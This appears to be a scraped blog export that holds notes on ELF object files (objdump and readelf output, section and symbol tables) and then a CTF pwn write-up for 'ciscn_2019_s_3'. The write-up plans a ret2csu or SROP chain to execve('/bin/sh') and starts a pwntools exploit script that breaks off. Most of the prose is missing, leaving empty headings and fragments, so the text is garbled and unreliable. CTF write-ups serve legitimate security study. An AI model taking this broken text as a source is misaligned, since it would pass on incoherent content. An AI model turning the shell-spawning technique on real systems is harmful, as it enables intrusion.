class=\"keyword\">int</span> global_uninit_var;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">func1</span><span class=\"params\">(<span class=\"keyword\">int</span> i)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>,i);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">static</span> <span class=\"keyword\">int</span> static_var = <span class=\"number\">85</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">static</span> <span class=\"keyword\">int</span> static_var2;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> b;</span><br><span class=\"line\">\tfunc1(static_var + static_var2 + a + b);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210209161901015.png\" alt=\"image-20210209161901015\"></p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ objdump -h a.o</span><br><span class=\"line\">&#x2F;&#x2F;-h</span><br><span class=\"line\">&#x2F;&#x2F;-x</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210209162052499.png\" alt=\"image-20210209162052499\"></p>\n<blockquote>\n<p>bss</p>\n<p><strong></strong><code>.rodata</code> <strong></strong><code>.comment</code> <strong></strong><code>.note.GNU-stack</code></p>\n<p>CONTENTS ALLOCCONTENTS</p>\n<p>BSSCONTENTSELF</p>\n<p></p>\n</blockquote>\n<p><code>.note.GNU-stack</code></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210209163804417.png\" alt=\"image-20210209163804417\"></p>\n<h3 id=\"3-1-\"><a href=\"#3-1-\" class=\"headerlink\" title=\"3.1 \"></a>3.1 </h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ objdump -s -d a.o</span><br><span class=\"line\">&#x2F;&#x2F;-s 16</span><br><span class=\"line\">&#x2F;&#x2F;-d </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a.o      elf32-i386</span><br><span class=\"line\"></span><br><span class=\"line\">Contents of section .text:</span><br><span class=\"line\"> 0000 5589e583 ec0883ec 08ff7508 68000000  U.........u.h...</span><br><span class=\"line\"> 0010 00e8fcff ffff83c4 1090c9c3 8d4c2404  .............L$.</span><br><span class=\"line\"> 0020 83e4f0ff 71fc5589 e55183ec 14c745f0  ....q.U..Q....E.</span><br><span class=\"line\"> 0030 01000000 8b150400 0000a100 00000001  ................</span><br><span class=\"line\"> 0040 c28b45f0 01c28b45 f401d083 ec0c50e8  ..E....E......P.</span><br><span class=\"line\"> 0050 fcffffff 83c410b8 00000000 8b4dfcc9  .............M..</span><br><span class=\"line\"> 0060 8d61fcc3                             .a..            </span><br><span class=\"line\">Contents of section .data:</span><br><span class=\"line\"> 0000 54000000 55000000                    T...U...        </span><br><span class=\"line\">Contents of section .rodata:</span><br><span class=\"line\"> 0000 25640a00                             %d..            </span><br><span class=\"line\">Contents of section .comment:</span><br><span class=\"line\"> 0000 00474343 3a202855 62756e74 7520352e  .GCC: (Ubuntu 5.</span><br><span class=\"line\"> 0010 342e302d 36756275 6e747531 7e31362e  4.0-6ubuntu1~16.</span><br><span class=\"line\"> 0020 30342e31 32292035 2e342e30 20323031  04.12) 5.4.0 201</span><br><span class=\"line\"> 0030 36303630 3900                        60609.          </span><br><span class=\"line\">Contents of section .eh_frame:</span><br><span class=\"line\"> 0000 14000000 00000000 017a5200 017c0801  .........zR..|..</span><br><span class=\"line\"> 0010 1b0c0404 88010000 1c000000 1c000000  ................</span><br><span class=\"line\"> 0020 00000000 1c000000 00410e08 8502420d  .........A....B.</span><br><span class=\"line\"> 0030 0558c50c 04040000 28000000 3c000000  .X......(...&lt;...</span><br><span class=\"line\"> 0040 1c000000 48000000 00440c01 00471005  ....H....D...G..</span><br><span class=\"line\"> 0050 02750043 0f03757c 06750c01 0041c543  .u.C..u|.u...A.C</span><br><span class=\"line\"> 0060 0c040400                             ....            </span><br><span class=\"line\"></span><br><span class=\"line\">Disassembly of section .text:</span><br><span class=\"line\"></span><br><span class=\"line\">00000000 &lt;func1&gt;:</span><br><span class=\"line\">   0:\t55                   \tpush   %ebp</span><br><span class=\"line\">   1:\t89 e5                \tmov    %esp,%ebp</span><br><span class=\"line\">   3:\t83 ec 08             \tsub    $0x8,%esp</span><br><span class=\"line\">   6:\t83 ec 08             \tsub    $0x8,%esp</span><br><span class=\"line\">   9:\tff 75 08             \tpushl  0x8(%ebp)</span><br><span class=\"line\">   c:\t68 00 00 00 00       \tpush   $0x0</span><br><span class=\"line\">  11:\te8 fc ff ff ff       \tcall   12 &lt;func1+0x12&gt;</span><br><span class=\"line\">  16:\t83 c4 10             \tadd    $0x10,%esp</span><br><span class=\"line\">  19:\t90                   \tnop</span><br><span class=\"line\">  1a:\tc9                   \tleave  </span><br><span class=\"line\">  1b:\tc3                   \tret    </span><br><span class=\"line\"></span><br><span class=\"line\">0000001c &lt;main&gt;:</span><br><span class=\"line\">  1c:\t8d 4c 24 04          \tlea    0x4(%esp),%ecx</span><br><span class=\"line\">  20:\t83 e4 f0             \tand    $0xfffffff0,%esp</span><br><span class=\"line\">  23:\tff 71 fc             \tpushl  -0x4(%ecx)</span><br><span class=\"line\">  26:\t55                   \tpush   %ebp</span><br><span class=\"line\">  27:\t89 e5                \tmov    %esp,%ebp</span><br><span class=\"line\">  29:\t51                   \tpush   %ecx</span><br><span class=\"line\">  2a:\t83 ec 14             \tsub    $0x14,%esp</span><br><span class=\"line\">  2d:\tc7 45 f0 01 00 00 00 \tmovl   $0x1,-0x10(%ebp)</span><br><span class=\"line\">  34:\t8b 15 04 00 00 00    \tmov    0x4,%edx</span><br><span class=\"line\">  3a:\ta1 00 00 00 00       \tmov    0x0,%eax</span><br><span class=\"line\">  3f:\t01 c2                \tadd    %eax,%edx</span><br><span class=\"line\">  41:\t8b 45 f0             \tmov    -0x10(%ebp),%eax</span><br><span class=\"line\">  44:\t01 c2                \tadd    %eax,%edx</span><br><span class=\"line\">  46:\t8b 45 f4             \tmov    -0xc(%ebp),%eax</span><br><span class=\"line\">  49:\t01 d0                \tadd    %edx,%eax</span><br><span class=\"line\">  4b:\t83 ec 0c             \tsub    $0xc,%esp</span><br><span class=\"line\">  4e:\t50                   \tpush   %eax</span><br><span class=\"line\">  4f:\te8 fc ff ff ff       \tcall   50 &lt;main+0x34&gt;</span><br><span class=\"line\">  54:\t83 c4 10             \tadd    $0x10,%esp</span><br><span class=\"line\">  57:\tb8 00 00 00 00       \tmov    $0x0,%eax</span><br><span class=\"line\">  5c:\t8b 4d fc             \tmov    -0x4(%ebp),%ecx</span><br><span class=\"line\">  5f:\tc9                   \tleave  </span><br><span class=\"line\">  60:\t8d 61 fc             \tlea    -0x4(%ecx),%esp</span><br><span class=\"line\">  63:\tc3                   \tret</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p></p>\n<p></p>\n<p>16ascii</p>\n<p></p>\n</blockquote>\n<h3 id=\"3-2-\"><a href=\"#3-2-\" class=\"headerlink\" title=\"3.2 \"></a>3.2 </h3><p><code>.data</code><strong></strong>,<code>.data</code></p>\n<p><code>.rodata</code><code>printf</code><code>%d\\n\\0</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Contents of section .data:</span><br><span class=\"line\"> 0000 54000000 55000000                    T...U...        </span><br><span class=\"line\">Contents of section .rodata:</span><br><span class=\"line\"> 0000 25640a00                             %d..</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><code>.data</code>84 850x54 0x00 0x00 0x00</p>\n<p><code>.rodata</code>%d\\n\\0</p>\n</blockquote>\n<h3 id=\"3-3-BSS\"><a href=\"#3-3-BSS\" class=\"headerlink\" title=\"3.3 BSS\"></a>3.3 BSS</h3><p><code>.bss</code><strong></strong></p>\n<h3 id=\"3-4-\"><a href=\"#3-4-\" class=\"headerlink\" title=\"3.4 \"></a>3.4 </h3><p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210140348425.png\" alt=\"image-20210210140348425\"></p>\n<p>.</p>\n<blockquote>\n<p></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">objcopy -I binary -O elf32-i386 -B i386 image.jpg image.o</span><br><span class=\"line\">objdump -ht image.o</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-ELF\"><a href=\"#4-ELF\" class=\"headerlink\" title=\"4.ELF\"></a>4.ELF</h2><p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210141207866.png\" alt=\"image-20210210141207866\"></p>\n<p>ELF<strong>ELF</strong>ELF</p>\n<p>ELF(Section Hearder Table)ELF</p>\n<h3 id=\"4-1-\"><a href=\"#4-1-\" class=\"headerlink\" title=\"4.1 \"></a>4.1 </h3><p>ELF</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210141759681.png\" alt=\"image-20210210141759681\"></p>\n<p>ELF<strong>ABI</strong></p>\n<p>elf.h</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142310041.png\" alt=\"image-20210210142310041\"></p>\n<p>Elf32_Ehdr</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142459097.png\" alt=\"image-20210210142459097\"></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142507074.png\" alt=\"image-20210210142507074\"></p>\n<p></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142536099.png\" alt=\"image-20210210142536099\"></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142548337.png\" alt=\"image-20210210142548337\"></p>\n<p></p>\n<p><strong></strong></p>\n<p>ELF1616</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142844872.png\" alt=\"image-20210210142844872\"></p>\n<p>4ELF</p>\n<p>0x7F 0x45 0x4C 0x46 7FasciiDEL45 4c 46asciiELFa.out0x01 0x07PE0x4d 0x5a</p>\n<p></p>\n<p>0x0132 0x0264 </p>\n<p>6 </p>\n<p>7190</p>\n<p><strong></strong></p>\n<p>e_type</p>\n<p>ELF</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210143702078.png\" alt=\"image-20210210143702078\"></p>\n<h3 id=\"4-2-\"><a href=\"#4-2-\" class=\"headerlink\" title=\"4.2 \"></a>4.2 </h3><p><strong>Section Header Table</strong></p>\n<p>ELF</p>\n<p>ELF<code>e_shoff</code></p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ readelf -S a.o</span><br><span class=\"line\">&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210144604296.png\" alt=\"image-20210210144604296\"></p>\n<p><code>Elf32_Shdr</code><code>Elf32_Shdr</code><strong></strong></p>\n<p>1312</p>\n<p><code>Elf32_Shdr</code></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210144945550.png\" alt=\"image-20210210144945550\"></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210145159772.png\" alt=\"image-20210210145159772\"></p>\n<p><strong></strong></p>\n<p></p>\n<p><strong>sh_type(sh_flags)</strong></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210145930584.png\" alt=\"image-20210210145930584\"></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210145922440.png\" alt=\"image-20210210145922440\"></p>\n<p><strong></strong></p>\n<p></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210150400718.png\" alt=\"image-20210210150400718\"></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210150408040.png\" alt=\"image-20210210150408040\"></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210150429555.png\" alt=\"image-20210210150429555\"></p>\n<p><strong></strong></p>\n<p>sh_linksh_info</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210150637999.png\" alt=\"image-20210210150637999\"></p>\n<h3 id=\"4-3-\"><a href=\"#4-3-\" class=\"headerlink\" title=\"4.3 \"></a>4.3 </h3><p></p>\n<p><code>.rel.text</code></p>\n<p><strong></strong></p>\n<p><code>.text</code><code>printf</code><code>.rel.text</code><code>.data</code></p>\n<p>ELF<code>SHT_REL</code><code>sh_link</code><code>sh_info</code></p>\n<hr>\n<h3 id=\"4-4-\"><a href=\"#4-4-\" class=\"headerlink\" title=\"4.4 \"></a>4.4 </h3><p></p>\n<h2 id=\"5-\"><a href=\"#5-\" class=\"headerlink\" title=\"5.\"></a>5.</h2><p></p>\n<p>BAfooA<strong>foo</strong>B<strong>foo</strong></p>\n<p><strong></strong><strong></strong></p>\n<p><strong></strong></p>\n<p></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210153736035.png\" alt=\"image-20210210153736035\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ nm a.o</span><br><span class=\"line\">&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210203929970.png\" alt=\"image-20210210203929970\"></p>\n<h3 id=\"5-1-ELF\"><a href=\"#5-1-ELF\" class=\"headerlink\" title=\"5.1 ELF\"></a>5.1 ELF</h3><p>ELF<code>.symtab</code>ELF32_Sym</p>\n<p>Elf32_Sym</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204148472.png\" alt=\"image-20210210204148472\"></p>\n<p></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204233887.png\" alt=\"image-20210210204233887\"></p>\n<p><strong>st_info</strong></p>\n<p>428</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204418983.png\" alt=\"image-20210210204418983\"></p>\n<p><strong>st_shndx</strong></p>\n<p>sh_shndx</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204647740.png\" alt=\"image-20210210204647740\"></p>\n<p><strong></strong></p>\n<p></p>\n<p></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204943554.png\" alt=\"image-20210210204943554\"></p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">readelf -s a.o</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210205129282.png\" alt=\"image-20210210205129282\"></p>\n<blockquote>\n<p>Num</p>\n<p>vaule<code>st_value</code></p>\n<p>Size<code>st_size</code></p>\n<p></p>\n<p>Ndx<code>st_shndx</code></p>\n<p></p>\n</blockquote>\n<p></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210205708052.png\" alt=\"image-20210210205708052\"></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210205716690.png\" alt=\"image-20210210205716690\"></p>\n<h3 id=\"5-2-\"><a href=\"#5-2-\" class=\"headerlink\" title=\"5.2 \"></a>5.2 </h3><p></p>\n<p>ld</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210211122171.png\" alt=\"image-20210210211122171\"></p>\n<p></p>\n<h1 id=\"0x03-\"><a href=\"#0x03-\" class=\"headerlink\" title=\"0x03 \"></a>0x03 </h1>","categories":[],"tags":["Book"]},{"title":"","url":"https://pz1o.top/2021/02/14//","content":"<h1 id=\"ciscn-2019-s-3\"><a href=\"#ciscn-2019-s-3\" class=\"headerlink\" title=\"ciscn_2019_s_3\"></a><strong>ciscn_2019_s_3</strong></h1><p></p>\n<p>main</p>\n<p><img src=\"/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214151957313.png\" alt=\"image-20210214151957313\"></p>\n<p>vuln</p>\n<p><img src=\"/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214152021865.png\" alt=\"image-20210214152021865\"></p>\n<p>gadgets</p>\n<p><img src=\"/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214152042139.png\" alt=\"image-20210214152042139\"></p>\n<p>gadgets</p>\n<p>0f153b59</p>\n<blockquote>\n<p>15 sys_rt_sigreturn<br>59 sys_execve</p>\n</blockquote>\n<p><strong>syscall</strong></p>\n<h2 id=\"syscall\"><a href=\"#syscall\" class=\"headerlink\" title=\"syscall\"></a>syscall</h2><p>syscall</p>\n<p>wiki</p>\n<p><img src=\"/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214153005144.png\" alt=\"image-20210214153005144\"></p>\n<p>3264</p>\n<blockquote>\n<p>32</p>\n<p>  eax   ebxecxedxeax</p>\n<p>sys_read   3 sys_write   4</p>\n<p>:  int 80h </p>\n<p>64</p>\n<p>  rax   rdirsirdxrax</p>\n<p>sys_read   0 sys_write   1</p>\n<p>stub_execve   59 stub_rt_sigreturn   15</p>\n<p>:  syscall </p>\n</blockquote>\n<h2 id=\"wp\"><a href=\"#wp\" class=\"headerlink\" title=\"wp\"></a>wp</h2><p></p>\n<p></p>\n<p>vuln</p>\n<p><img src=\"/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214153444144.png\" alt=\"image-20210214153444144\"></p>\n<p></p>\n<p>leave</p>\n<p>offset0x10</p>\n<hr>\n<p>gadgets</p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov rax0Fh    &#x2F;&#x2F;   0Fh  15    15  sys_rt_sigreturn</span><br><span class=\"line\">mov rax3Bh     &#x2F;&#x2F;  3Bh   59    15   sys_execve </span><br></pre></td></tr></table></figure>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> ret2__libc_csu_init  execve(&quot;&#x2F;bin&#x2F;sh&quot;,0,0)  getshell</span><br><span class=\"line\">srop  sigreturn frame   execve(&quot;&#x2F;bin&#x2F;sh&quot;,0,0)  getshell</span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"ret2-libc-csu-init\"><a href=\"#ret2-libc-csu-init\" class=\"headerlink\" title=\"ret2__libc_csu_init\"></a>ret2__libc_csu_init</h3><p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rdi &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class=\"line\">rsi 0</span><br><span class=\"line\">rdx 0</span><br></pre></td></tr></table></figure>\n<p>gadget</p>\n<p><img src=\"/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214154550271.png\" alt=\"image-20210214154550271\"></p>\n<p>rdi rsi rdx</p>\n<p>ida</p>\n<p><img src=\"/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214162318162.png\" alt=\"image-20210214162318162\"></p>\n<p>rdx</p>\n<p>gadget/bin/sh</p>\n<p></p>\n<p>wpwrite</p>\n<p></p>\n<p>wp</p>\n<ol>\n<li><p>bin/sh</p>\n</li>\n<li><p>ROP</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call    qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure>\n<p>r12,rbxgadget</p>\n</li>\n<li><p>call</p>\n</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level='debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># io = process(\"./ciscn_2019_s_3\")</span></span><br><span class=\"line\">p = 